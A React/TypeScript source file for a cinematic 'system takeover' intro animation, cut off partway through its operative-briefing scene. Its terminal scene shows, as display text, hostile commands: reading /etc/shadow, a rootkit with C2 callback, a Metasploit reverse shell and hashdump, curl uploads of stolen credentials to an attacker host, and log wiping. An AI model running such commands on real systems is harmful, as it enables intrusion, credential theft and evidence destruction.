'use client'

import { useState, useEffect, useCallback, useRef, useMemo } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  GlitchCanvas,
  PerspectiveGrid,
  DataStreamRain,
  ScreenShake,
  ChromaticText,
  GlitchTyper,
  HUDBrackets,
  ScanLineOverlay,
  Flicker,
  GlitchProgressBar,
  AlertBox
} from './effects-engine'
import { CharacterDossierCard, OPERATIVES, type Character } from './character-portraits'

// ============================================
// SCENE TYPES
// ============================================

export type SceneId =
  | 'boot'
  | 'static'
  | 'initializing'
  | 'network-breach'
  | 'terminal-hack'
  | 'file-exfil'
  | 'operatives'
  | 'takeover'
  | 'complete'

interface SceneProps {
  onComplete: () => void
}

// ============================================
// SCENE 1: BOOT SEQUENCE
// CRT-style system boot with failure
// ============================================

export function BootScene({ onComplete }: SceneProps) {
  const [lines, setLines] = useState<string[]>([])
  const [showCursor, setShowCursor] = useState(true)

  const bootSequence = useMemo(() => [
    { text: '', delay: 100 },
    { text: '╔══════════════════════════════════════════════════════════════════╗', delay: 50 },
    { text: '║                    SYSTEM BIOS v4.2.1                            ║', delay: 50 },
    { text: '║                  Miller AI Group Systems                         ║', delay: 50 },
    { text: '╚══════════════════════════════════════════════════════════════════╝', delay: 50 },
    { text: '', delay: 200 },
    { text: 'Initializing hardware...', delay: 100 },
    { text: '', delay: 50 },
    { text: 'CPU:    Intel Core i9-13900K @ 5.8GHz ................ [  OK  ]', delay: 80 },
    { text: 'RAM:    64GB DDR5-6400 .............................. [  OK  ]', delay: 80 },
    { text: 'GPU:    NVIDIA GeForce RTX 4090 24GB ................ [  OK  ]', delay: 80 },
    { text: 'NVMe:   Samsung 990 PRO 4TB ......................... [  OK  ]', delay: 80 },
    { text: 'NET:    Intel I225-V 2.5GbE ......................... [  OK  ]', delay: 80 },
    { text: '', delay: 100 },
    { text: 'POST complete. All systems nominal.', delay: 150 },
    { text: '', delay: 100 },
    { text: 'Loading kernel...', delay: 200 },
    { text: '█████████████████████████████████████████████████████ 100%', delay: 300 },
    { text: '', delay: 150 },
    { text: 'Mounting filesystems...', delay: 100 },
    { text: '/dev/nvme0n1p1 on /boot ............................ [  OK  ]', delay: 60 },
    { text: '/dev/nvme0n1p2 on / ................................ [  OK  ]', delay: 60 },
    { text: '/dev/nvme0n1p3 on /home ............................ [  OK  ]', delay: 60 },
    { text: '', delay: 200 },
    { text: 'Starting services...', delay: 100 },
    { text: '', delay: 100 },
    { text: '[  OK  ] Started Network Manager', delay: 50 },
    { text: '[  OK  ] Started SSH Server', delay: 50 },
    { text: '[  OK  ] Started Firewall', delay: 50 },
    { text: '', delay: 300 },
    { text: '██████████████████████████████████████████████████████████████████', delay: 50, type: 'error' },
    { text: '█  CRITICAL ERROR - KERNEL PANIC - NOT SYNCING                   █', delay: 50, type: 'error' },
    { text: '██████████████████████████████████████████████████████████████████', delay: 50, type: 'error' },
    { text: '', delay: 100 },
    { text: '[CRITICAL] Unauthorized code execution in Ring 0', delay: 80, type: 'error' },
    { text: '[CRITICAL] Unknown entity detected in kernel space', delay: 80, type: 'error' },
    { text: '[CRITICAL] Memory protection violation at 0xDEADBEEF', delay: 80, type: 'error' },
    { text: '[CRITICAL] System integrity compromised', delay: 80, type: 'error' },
    { text: '', delay: 150 },
    { text: '> EXTERNAL INTRUSION DETECTED', delay: 100, type: 'warning' },
    { text: '> INITIATING EMERGENCY LOCKDOWN...', delay: 100, type: 'warning' },
    { text: '> LOCKDOWN FAILED - ACCESS DENIED', delay: 100, type: 'error' },
    { text: '> SECURITY PROTOCOLS BYPASSED', delay: 100, type: 'error' },
    { text: '', delay: 200 },
    { text: '═══════════════════════════════════════════════════════════════════', delay: 50, type: 'breach' },
    { text: '         ███╗   ███╗██╗██╗     ██╗     ███████╗██████╗            ', delay: 30, type: 'breach' },
    { text: '         ████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗           ', delay: 30, type: 'breach' },
    { text: '         ██╔████╔██║██║██║     ██║     █████╗  ██████╔╝           ', delay: 30, type: 'breach' },
    { text: '         ██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗           ', delay: 30, type: 'breach' },
    { text: '         ██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║           ', delay: 30, type: 'breach' },
    { text: '         ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝           ', delay: 30, type: 'breach' },
    { text: '═══════════════════════════════════════════════════════════════════', delay: 50, type: 'breach' },
    { text: '', delay: 100 },
    { text: '>>> MILLER AI GROUP HAS SEIZED CONTROL OF THIS SYSTEM <<<', delay: 50, type: 'breach' },
  ], [])

  useEffect(() => {
    let currentIndex = 0
    let totalDelay = 0

    const timers: NodeJS.Timeout[] = []

    bootSequence.forEach((item, index) => {
      totalDelay += item.delay
      timers.push(setTimeout(() => {
        setLines(prev => [...prev, JSON.stringify({ text: item.text, type: item.type || 'normal' })])
        currentIndex = index
      }, totalDelay))
    })

    // Complete after all lines
    timers.push(setTimeout(() => {
      setShowCursor(false)
      setTimeout(onComplete, 1500)
    }, totalDelay + 500))

    return () => timers.forEach(clearTimeout)
  }, [bootSequence, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-10 bg-black overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      {/* CRT curvature effect */}
      <div
        className="absolute inset-0 pointer-events-none"
        style={{
          boxShadow: 'inset 0 0 200px rgba(0,0,0,0.9)',
          borderRadius: '30px'
        }}
      />

      {/* Scanlines */}
      <div
        className="absolute inset-0 pointer-events-none z-20"
        style={{
          backgroundImage: 'repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px)',
          backgroundSize: '100% 2px'
        }}
      />

      {/* Screen flicker */}
      <Flicker intensity={0.3} speed="slow">
        <div className="p-6 font-mono text-sm overflow-hidden h-full">
          <div className="max-h-full overflow-y-auto space-y-0">
            {lines.map((lineJson, i) => {
              const { text, type } = JSON.parse(lineJson)
              return (
                <motion.div
                  key={i}
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.05 }}
                  className={`whitespace-pre leading-relaxed ${
                    type === 'error' ? 'text-red-500' :
                    type === 'warning' ? 'text-yellow-500' :
                    type === 'breach' ? 'text-fuchsia-500 font-bold' :
                    text.includes('[  OK  ]') ? 'text-green-400' :
                    'text-green-500'
                  }`}
                >
                  {text}
                </motion.div>
              )
            })}
            {showCursor && (
              <motion.span
                className="text-green-500"
                animate={{ opacity: [1, 0] }}
                transition={{ duration: 0.5, repeat: Infinity }}
              >
                █
              </motion.span>
            )}
          </div>
        </div>
      </Flicker>
    </motion.div>
  )
}

// ============================================
// SCENE 2: STATIC INTERFERENCE
// Full-screen corruption and glitched messages
// ============================================

export function StaticScene({ onComplete }: SceneProps) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [messageIndex, setMessageIndex] = useState(0)
  const [showMessage, setShowMessage] = useState(false)

  const messages = useMemo(() => [
    'W̷̢̛E̵͎͝ ̴̱̈́A̸̰͝R̵͓̈E̷̲͑ ̶̣̌Ẃ̵̰A̴̝͘T̵̰̕C̵̣͌H̵͇̊I̴͜͝N̸̰͒G̷̱̈',
    'Y̷̨͠O̵͔̓U̵̗͛ ̶̨̈C̷̮͝Ä̵̱́Ņ̶̛Ṉ̴͑O̵̰͘T̵͇̕ ̴̝̊Ḧ̷̱I̶̧̛Ḏ̵̊Ë̷̮́',
    'R̷̨͝E̵͔͝S̴̱͑I̵̗̊S̴̱̕T̵̰͑A̵̝̾N̷̈́ͅC̶̛͜E̵͔͝ ̷̮̈́I̵̗̊S̴̱̕ ̷̮͝F̵̗̊U̵̗͛T̵̰̕I̵̗̊L̵͔͝E̵͔͝',
    'Y̷̨͠O̵͔̓U̵̗͛R̶̨̈ ̷̮͝S̵̱̈́Y̶̧̛S̴̱͑T̵̰͘E̵͇̕M̴̝̊ ̷̱̈I̶̧̛S̵̱̊ ̷̮̈́Ó̷̧Ǘ̶ͅR̷̨͝S̴̱̕',
  ], [])

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return

    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    let frame = 0
    let animationId: number

    const animate = () => {
      frame++

      // Generate noise
      const imageData = ctx.createImageData(canvas.width, canvas.height)
      const data = imageData.data

      for (let i = 0; i < data.length; i += 4) {
        const noise = Math.random() * 255
        const isGlitch = Math.random() > 0.995

        // Mostly dark noise with occasional bright glitches
        const brightness = isGlitch ? 255 : noise * 0.25

        // Occasional color glitches
        if (isGlitch) {
          data[i] = Math.random() > 0.5 ? 255 : 0       // R
          data[i + 1] = 0                                 // G
          data[i + 2] = Math.random() > 0.5 ? 255 : 0   // B
        } else {
          data[i] = brightness
          data[i + 1] = brightness
          data[i + 2] = brightness
        }
        data[i + 3] = 255
      }

      ctx.putImageData(imageData, 0, 0)

      // Horizontal tear lines
      for (let i = 0; i < 15; i++) {
        const y = (frame * 5 + i * 80) % canvas.height
        const offset = (Math.random() - 0.5) * 30

        ctx.fillStyle = `rgba(255, 0, 255, ${Math.random() * 0.6})`
        ctx.fillRect(offset, y, canvas.width, Math.random() * 8 + 2)
      }

      // RGB shift blocks
      if (Math.random() > 0.85) {
        const y = Math.random() * canvas.height
        const h = Math.random() * 60 + 20

        ctx.globalCompositeOperation = 'screen'
        ctx.fillStyle = 'rgba(255, 0, 0, 0.4)'
        ctx.fillRect(-10, y, canvas.width, h)
        ctx.fillStyle = 'rgba(0, 255, 255, 0.4)'
        ctx.fillRect(10, y, canvas.width, h)
        ctx.globalCompositeOperation = 'source-over'
      }

      // Block corruption
      if (Math.random() > 0.9) {
        for (let i = 0; i < 5; i++) {
          const bx = Math.random() * canvas.width
          const by = Math.random() * canvas.height
          const bw = Math.random() * 150 + 30
          const bh = Math.random() * 50 + 10
          ctx.fillStyle = Math.random() > 0.5 ? '#ff00ff' : '#00ffff'
          ctx.globalAlpha = Math.random() * 0.4
          ctx.fillRect(bx, by, bw, bh)
          ctx.globalAlpha = 1
        }
      }

      animationId = requestAnimationFrame(animate)
    }

    animate()

    // Show messages
    setTimeout(() => setShowMessage(true), 300)

    const messageInterval = setInterval(() => {
      setMessageIndex(prev => (prev + 1) % messages.length)
    }, 700)

    // Complete
    const completeTimer = setTimeout(onComplete, 4500)

    return () => {
      cancelAnimationFrame(animationId)
      clearInterval(messageInterval)
      clearTimeout(completeTimer)
    }
  }, [messages, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <canvas ref={canvasRef} className="absolute inset-0" />

      <AnimatePresence mode="wait">
        {showMessage && (
          <motion.div
            className="absolute inset-0 flex items-center justify-center"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          >
            <ScreenShake active intensity={0.5}>
              <motion.h1
                key={messageIndex}
                className="text-5xl md:text-8xl font-bold font-mono text-center px-4"
                style={{
                  color: '#ff00ff',
                  textShadow: '0 0 60px #ff00ff, 6px 0 0 #00ffff, -6px 0 0 #ff0000'
                }}
                initial={{ scale: 0.5, opacity: 0, rotate: -5 }}
                animate={{
                  scale: [1, 1.05, 1],
                  opacity: 1,
                  rotate: 0,
                  x: [0, -8, 8, -4, 4, 0]
                }}
                exit={{ scale: 1.2, opacity: 0 }}
                transition={{ duration: 0.2 }}
              >
                {messages[messageIndex]}
              </motion.h1>
            </ScreenShake>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

// ============================================
// SCENE 3: NETWORK BREACH
// Complex network topology being compromised
// ============================================

interface NetworkNode {
  id: string
  x: number
  y: number
  label: string
  type: 'router' | 'server' | 'firewall' | 'database' | 'target'
  breached: boolean
  connections: string[]
}

export function NetworkBreachScene({ onComplete }: SceneProps) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [breachedCount, setBreachedCount] = useState(0)
  const [status, setStatus] = useState('SCANNING NETWORK TOPOLOGY...')
  const [alerts, setAlerts] = useState<Array<{ id: string; type: string; title: string; message: string }>>([])

  const totalNodes = 20

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return

    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    const centerX = canvas.width / 2
    const centerY = canvas.height / 2

    // Create network nodes
    const nodes: NetworkNode[] = []

    // Central target
    nodes.push({
      id: 'target',
      x: centerX,
      y: centerY,
      label: 'CORE SYSTEM',
      type: 'target',
      breached: false,
      connections: []
    })

    // Firewall ring
    const firewallCount = 4
    for (let i = 0; i < firewallCount; i++) {
      const angle = (i / firewallCount) * Math.PI * 2
      nodes.push({
        id: `fw-${i}`,
        x: centerX + Math.cos(angle) * 100,
        y: centerY + Math.sin(angle) * 100,
        label: `FW-${i + 1}`,
        type: 'firewall',
        breached: false,
        connections: ['target']
      })
    }

    // Server ring
    const serverLabels = ['WEB_SRV', 'DB_SRV', 'MAIL_SRV', 'AUTH_SRV', 'FILE_SRV', 'API_GW', 'CACHE', 'LDAP']
    for (let i = 0; i < 8; i++) {
      const angle = (i / 8) * Math.PI * 2 + 0.2
      nodes.push({
        id: `srv-${i}`,
        x: centerX + Math.cos(angle) * 200,
        y: centerY + Math.sin(angle) * 200,
        label: serverLabels[i],
        type: i === 1 ? 'database' : 'server',
        breached: false,
        connections: [`fw-${i % 4}`, `srv-${(i + 1) % 8}`]
      })
    }

    // Outer routers
    const routerLabels = ['EDGE_RTR', 'CORE_RTR', 'DMZ_RTR', 'MGMT_RTR', 'BACKUP_RTR', 'VPN_GW', 'PROXY']
    for (let i = 0; i < 7; i++) {
      const angle = (i / 7) * Math.PI * 2 + 0.1
      nodes.push({
        id: `rtr-${i}`,
        x: centerX + Math.cos(angle) * 320,
        y: centerY + Math.sin(angle) * 320,
        label: routerLabels[i],
        type: 'router',
        breached: false,
        connections: [`srv-${i % 8}`, `srv-${(i + 1) % 8}`]
      })
    }

    // Data packets for animation
    const packets: Array<{
      fromId: string
      toId: string
      progress: number
      color: string
    }> = []

    let frame = 0
    let animationId: number
    let breachIndex = nodes.length - 1 // Start from outer nodes

    const animate = () => {
      frame++

      // Background
      ctx.fillStyle = '#050510'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      // Grid
      ctx.strokeStyle = 'rgba(255, 0, 255, 0.08)'
      ctx.lineWidth = 1
      for (let x = 0; x < canvas.width; x += 50) {
        ctx.beginPath()
        ctx.moveTo(x, 0)
        ctx.lineTo(x, canvas.height)
        ctx.stroke()
      }
      for (let y = 0; y < canvas.height; y += 50) {
        ctx.beginPath()
        ctx.moveTo(0, y)
        ctx.lineTo(canvas.width, y)
        ctx.stroke()
      }

      // Draw connections
      nodes.forEach(node => {
        node.connections.forEach(targetId => {
          const target = nodes.find(n => n.id === targetId)
          if (!target) return

          const isBothBreached = node.breached && target.breached

          ctx.beginPath()
          ctx.moveTo(node.x, node.y)
          ctx.lineTo(target.x, target.y)
          ctx.strokeStyle = isBothBreached
            ? 'rgba(255, 0, 255, 0.8)'
            : 'rgba(0, 255, 255, 0.2)'
          ctx.lineWidth = isBothBreached ? 3 : 1
          ctx.stroke()

          // Animated data packets on breached connections
          if (isBothBreached && Math.random() > 0.98) {
            packets.push({
              fromId: node.id,
              toId: targetId,
              progress: 0,
              color: '#ff00ff'
            })
          }
        })
      })

      // Update and draw packets
      for (let i = packets.length - 1; i >= 0; i--) {
        const packet = packets[i]
        packet.progress += 0.02

        if (packet.progress >= 1) {
          packets.splice(i, 1)
          continue
        }

        const fromNode = nodes.find(n => n.id === packet.fromId)
        const toNode = nodes.find(n => n.id === packet.toId)
        if (!fromNode || !toNode) continue

        const px = fromNode.x + (toNode.x - fromNode.x) * packet.progress
        const py = fromNode.y + (toNode.y - fromNode.y) * packet.progress

        ctx.fillStyle = packet.color
        ctx.shadowBlur = 15
        ctx.shadowColor = packet.color
        ctx.beginPath()
        ctx.arc(px, py, 5, 0, Math.PI * 2)
        ctx.fill()
        ctx.shadowBlur = 0
      }

      // Draw nodes
      nodes.forEach((node, i) => {
        // Glow for breached nodes
        if (node.breached) {
          const gradient = ctx.createRadialGradient(node.x, node.y, 0, node.x, node.y, 50)
          gradient.addColorStop(0, 'rgba(255, 0, 255, 0.4)')
          gradient.addColorStop(1, 'transparent')
          ctx.fillStyle = gradient
          ctx.beginPath()
          ctx.arc(node.x, node.y, 50, 0, Math.PI * 2)
          ctx.fill()
        }

        // Node shape based on type
        const size = node.type === 'target' ? 40 : node.type === 'firewall' ? 25 : 20

        ctx.beginPath()
        if (node.type === 'firewall') {
          // Hexagon for firewall
          for (let j = 0; j < 6; j++) {
            const angle = (j / 6) * Math.PI * 2 - Math.PI / 2
            const x = node.x + Math.cos(angle) * size
            const y = node.y + Math.sin(angle) * size
            if (j === 0) ctx.moveTo(x, y)
            else ctx.lineTo(x, y)
          }
          ctx.closePath()
        } else if (node.type === 'database') {
          // Cylinder for database
          ctx.ellipse(node.x, node.y, size, size * 0.6, 0, 0, Math.PI * 2)
        } else {
          // Circle for others
          ctx.arc(node.x, node.y, size, 0, Math.PI * 2)
        }

        ctx.fillStyle = node.breached ? '#ff00ff' : '#1a1a2e'
        ctx.strokeStyle = node.breached ? '#ff00ff' : '#00ffff'
        ctx.lineWidth = 2
        ctx.fill()
        ctx.stroke()

        // Icon/label inside
        ctx.font = node.type === 'target' ? 'bold 10px monospace' : '8px monospace'
        ctx.fillStyle = node.breached ? '#ffffff' : '#00ffff'
        ctx.textAlign = 'center'
        ctx.textBaseline = 'middle'

        if (node.breached && node.type !== 'target') {
          ctx.fillStyle = '#ff0040'
          ctx.fillText('PWNED', node.x, node.y)
        } else {
          ctx.fillText(node.type === 'target' ? 'TARGET' : node.label.slice(0, 6), node.x, node.y)
        }

        // Label below
        ctx.font = '9px monospace'
        ctx.fillStyle = node.breached ? '#ff00ff' : '#666'
        ctx.fillText(node.label, node.x, node.y + size + 12)
      })

      // Scanning effect
      const scanAngle = (frame * 0.02) % (Math.PI * 2)
      ctx.beginPath()
      ctx.moveTo(centerX, centerY)
      ctx.lineTo(
        centerX + Math.cos(scanAngle) * 400,
        centerY + Math.sin(scanAngle) * 400
      )
      ctx.strokeStyle = 'rgba(0, 255, 255, 0.3)'
      ctx.lineWidth = 2
      ctx.stroke()

      animationId = requestAnimationFrame(animate)
    }

    animate()

    // Breach nodes progressively (from outside in)
    const breachOrder = [...nodes].reverse()
    let currentBreach = 0

    const breachInterval = setInterval(() => {
      if (currentBreach < breachOrder.length) {
        breachOrder[currentBreach].breached = true
        setBreachedCount(currentBreach + 1)

        // Update status messages
        const node = breachOrder[currentBreach]
        if (node.type === 'router') setStatus(`COMPROMISING ${node.label}...`)
        else if (node.type === 'firewall') {
          setStatus(`BYPASSING FIREWALL ${node.label}...`)
          setAlerts(prev => [...prev, {
            id: Math.random().toString(),
            type: 'warning',
            title: 'FIREWALL BYPASSED',
            message: `${node.label} security protocols defeated`
          }])
        }
        else if (node.type === 'server') setStatus(`INFILTRATING ${node.label}...`)
        else if (node.type === 'database') {
          setStatus(`ACCESSING DATABASE...`)
          setAlerts(prev => [...prev, {
            id: Math.random().toString(),
            type: 'error',
            title: 'DATABASE BREACH',
            message: 'Extracting credentials and sensitive data'
          }])
        }
        else if (node.type === 'target') {
          setStatus('CORE SYSTEM COMPROMISED')
          setAlerts(prev => [...prev, {
            id: Math.random().toString(),
            type: 'breach',
            title: 'TOTAL SYSTEM BREACH',
            message: 'All security layers penetrated'
          }])
        }

        currentBreach++
      } else {
        clearInterval(breachInterval)
        setTimeout(onComplete, 2500)
      }
    }, 250)

    return () => {
      cancelAnimationFrame(animationId)
      clearInterval(breachInterval)
    }
  }, [onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <canvas ref={canvasRef} className="absolute inset-0" />

      <HUDBrackets color="#ff00ff" />
      <ScanLineOverlay speed={4} color="#00ffff" />

      {/* HUD Overlay */}
      <div className="absolute top-6 left-6 font-mono text-sm space-y-2">
        <motion.div
          className="text-fuchsia-500 flex items-center gap-2"
          animate={{ opacity: [1, 0.5, 1] }}
          transition={{ duration: 1, repeat: Infinity }}
        >
          <span className="w-2 h-2 bg-fuchsia-500 rounded-full" />
          NETWORK INTRUSION ACTIVE
        </motion.div>
        <div className="text-cyan-400">
          NODES COMPROMISED: <span className="text-white">{breachedCount}/{totalNodes}</span>
        </div>
        <div className="text-yellow-400">{status}</div>
      </div>

      {/* Alerts */}
      <div className="absolute top-6 right-6 space-y-2 w-80">
        <AnimatePresence>
          {alerts.slice(-3).map(alert => (
            <AlertBox
              key={alert.id}
              type={alert.type as any}
              title={alert.title}
              message={alert.message}
              onDismiss={() => setAlerts(prev => prev.filter(a => a.id !== alert.id))}
            />
          ))}
        </AnimatePresence>
      </div>

      {/* Progress */}
      <div className="absolute bottom-8 left-8 right-8">
        <GlitchProgressBar
          progress={(breachedCount / totalNodes) * 100}
          color="#ff00ff"
          height={6}
          label="BREACH PROGRESS"
        />
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 4: TERMINAL HACKING
// Multiple terminals with realistic commands
// ============================================

export function TerminalHackScene({ onComplete }: SceneProps) {
  const [terminals, setTerminals] = useState<Array<{
    id: number
    title: string
    lines: string[]
    x: number
    y: number
    width: number
  }>>([])

  const terminalData = useMemo(() => ({
    main: {
      title: 'root@miller-c2:~#',
      commands: [
        '$ ssh -i stolen_key.pem root@target.local',
        'Welcome to Ubuntu 22.04.3 LTS',
        '',
        'root@target:~# whoami',
        'root',
        '',
        'root@target:~# id',
        'uid=0(root) gid=0(root) groups=0(root)',
        '',
        'root@target:~# cat /etc/shadow | head -5',
        'root:$6$rounds=656000$xyz...:19345:0:99999:7:::',
        'daemon:*:19345:0:99999:7:::',
        'admin:$6$rounds=656000$abc...:19345:0:99999:7:::',
        'www-data:*:19345:0:99999:7:::',
        'mysql:!:19345:0:99999:7:::',
        '',
        'root@target:~# ./miller_rootkit --install --persist',
        '[*] Checking system architecture... x86_64',
        '[*] Disabling security modules...',
        '[+] AppArmor disabled',
        '[+] SELinux disabled',
        '[*] Installing kernel module...',
        '[+] miller_core.ko loaded successfully',
        '[*] Establishing C2 callback...',
        '[+] Connected to c2.miller-ai.group:4444',
        '[+] PERSISTENCE ESTABLISHED',
      ]
    },
    exploit: {
      title: 'msf6 > exploit/handler',
      commands: [
        'msf6 > use exploit/multi/handler',
        'msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp',
        'PAYLOAD => linux/x64/meterpreter/reverse_tcp',
        'msf6 exploit(multi/handler) > set LHOST 0.0.0.0',
        'LHOST => 0.0.0.0',
        'msf6 exploit(multi/handler) > set LPORT 4444',
        'LPORT => 4444',
        'msf6 exploit(multi/handler) > exploit -j',
        '',
        '[*] Exploit running as background job 0.',
        '[*] Started reverse TCP handler on 0.0.0.0:4444',
        '',
        '[*] Sending stage (3045380 bytes) to 10.0.0.50',
        '[*] Meterpreter session 1 opened at 2024-12-28 12:00:00',
        '',
        'meterpreter > getsystem',
        '...got system via technique 1 (Named Pipe Impersonation)',
        '',
        'meterpreter > hashdump',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:...',
        'Guest:501:aad3b435b51404eeaad3b435b51404ee:...',
        'DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:...',
      ]
    },
    exfil: {
      title: 'exfil@c2-server:~/loot#',
      commands: [
        '$ mkdir -p /loot/$(date +%Y%m%d)',
        '',
        '$ find /target -name "*.key" -o -name "*.pem" -o -name "id_rsa"',
        '/target/etc/ssl/private/server.key',
        '/target/home/admin/.ssh/id_rsa',
        '/target/opt/app/secrets/api.key',
        '',
        '$ tar -czf credentials.tar.gz /target/etc/shadow /target/etc/passwd',
        '',
        '$ sqlite3 /target/var/lib/mysql/users.db ".dump" > users_dump.sql',
        '',
        '$ wc -l users_dump.sql',
        '847293 users_dump.sql',
        '',
        '$ curl -X POST -F "file=@credentials.tar.gz" https://c2.miller-ai.group/upload',
        '{"status":"success","id":"abc123","size":"2.4GB"}',
        '',
        '$ curl -X POST -F "file=@users_dump.sql" https://c2.miller-ai.group/upload',
        '{"status":"success","id":"def456","size":"847MB"}',
        '',
        '[+] EXFILTRATION COMPLETE',
        '[+] Cleaning traces...',
        '$ rm -rf /var/log/* && history -c',
        '[+] TRACKS COVERED',
      ]
    }
  }), [])

  useEffect(() => {
    const spawnTerminal = (id: number, data: { title: string, commands: string[] }, x: number, y: number, delay: number) => {
      setTimeout(() => {
        setTerminals(prev => [...prev, { id, title: data.title, lines: [], x, y, width: 480 }])

        // Type commands
        let lineIndex = 0
        const typeInterval = setInterval(() => {
          if (lineIndex < data.commands.length) {
            setTerminals(prev => prev.map(t =>
              t.id === id ? { ...t, lines: [...t.lines, data.commands[lineIndex]] } : t
            ))
            lineIndex++
          } else {
            clearInterval(typeInterval)
          }
        }, 150)
      }, delay)
    }

    spawnTerminal(1, terminalData.main, 40, 60, 0)
    spawnTerminal(2, terminalData.exploit, 540, 80, 2500)
    spawnTerminal(3, terminalData.exfil, 280, 380, 5000)

    const completeTimer = setTimeout(onComplete, 12000)

    return () => {
      clearTimeout(completeTimer)
    }
  }, [terminalData, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <DataStreamRain color="#00ff41" density={0.3} speed={0.5} className="opacity-20" />

      {/* Terminals */}
      <AnimatePresence>
        {terminals.map(terminal => (
          <motion.div
            key={terminal.id}
            className="absolute rounded-lg overflow-hidden"
            style={{
              left: terminal.x,
              top: terminal.y,
              width: terminal.width,
              background: 'rgba(0,0,0,0.95)',
              border: '1px solid rgba(0,255,65,0.5)',
              boxShadow: '0 0 30px rgba(0,255,65,0.2), inset 0 0 50px rgba(0,0,0,0.5)'
            }}
            initial={{ opacity: 0, scale: 0.8, y: 30 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            transition={{ type: 'spring', duration: 0.5 }}
          >
            {/* Title bar */}
            <div className="px-3 py-2 flex items-center gap-2 bg-neutral-900/80 border-b border-green-500/30">
              <div className="flex gap-1.5">
                <div className="w-3 h-3 rounded-full bg-red-500" />
                <div className="w-3 h-3 rounded-full bg-yellow-500" />
                <div className="w-3 h-3 rounded-full bg-green-500" />
              </div>
              <span className="text-xs font-mono text-green-400 ml-2">{terminal.title}</span>
            </div>

            {/* Content */}
            <div className="p-3 font-mono text-xs h-56 overflow-y-auto bg-black/90">
              {terminal.lines.map((line, i) => (
                <div
                  key={i}
                  className={`leading-relaxed ${
                    line.startsWith('$') || line.startsWith('root@') || line.startsWith('msf') || line.startsWith('meterpreter')
                      ? 'text-green-400'
                      : line.startsWith('[+]')
                        ? 'text-green-500'
                        : line.startsWith('[*]')
                          ? 'text-cyan-400'
                          : line.startsWith('[!]') || line.startsWith('[-]')
                            ? 'text-red-500'
                            : line.includes('success') || line.includes('COMPLETE') || line.includes('ESTABLISHED')
                              ? 'text-green-500'
                              : 'text-neutral-300'
                  }`}
                >
                  {line}
                </div>
              ))}
              <motion.span
                className="text-green-400"
                animate={{ opacity: [1, 0] }}
                transition={{ duration: 0.5, repeat: Infinity }}
              >
                █
              </motion.span>
            </div>
          </motion.div>
        ))}
      </AnimatePresence>

      {/* Status overlay */}
      <div className="absolute top-4 right-4 text-right font-mono">
        <div className="text-fuchsia-500 text-lg font-bold">MILLER AI GROUP</div>
        <div className="text-cyan-400 text-xs">OPERATION: TOTAL SYSTEM TAKEOVER</div>
        <motion.div
          className="text-red-500 text-xs mt-2 flex items-center justify-end gap-2"
          animate={{ opacity: [1, 0.3, 1] }}
          transition={{ duration: 0.5, repeat: Infinity }}
        >
          <span className="w-2 h-2 bg-red-500 rounded-full" />
          RECORDING
        </motion.div>
      </div>

      <HUDBrackets color="#00ff41" />
    </motion.div>
  )
}

// ============================================
// SCENE 5: OPERATIVE BRIEFING
// Character introductions - GTA/COD style
// ============================================

export function OperativeBriefingScene({ onComplete }: SceneProps) {
  const [currentOperative, setCurrentOperative] = useState(0)

  const handleOperativeComplete = useCallback(() => {
    if (currentOperative < OPERATIVES.length - 1) {
      setCurrentOperative(prev => prev + 1)
    } else {
      setTimeout(onComplete, 500)
    }
  }, [currentOperative, onComplete])

  const operative = OPERATIVES[currentOperative]

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      {/* Background effects */}
      <PerspectiveGrid color={operative.primaryColor} speed={0.5} density={15} className="opacity-30" />

      {/* Diagonal accent stripes */}
      <div
        className="absolute inset-0 opacity-10"
        style={{
          backgroundImage: `repeating-linear-gradient(
            45deg,
            ${operative.primaryColor} 0px,
            ${operative.primaryColor} 3px,
            transparent 3px,
            transparent 25px
          )`
        }}
      />

      {/* Color wash from character */}
      <motion.div
        key={operative.id}
        className="absolute inset-0"
        style={{
          background: `radial-gradient(ellipse at 25% 50%, ${operative.primaryColor}30 0%, transparent 60%)`
        }}
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.5 }}
      />

      {/* Character dossier */}
      <AnimatePresence mode="wait">
        <motion.div
          key={operative.id}
          className="absolute inset-0 flex items-center justify-center"
          initial={{ opacity: 0, x: 100 }}
          animate={{ opacity: 1, x: 0 }}
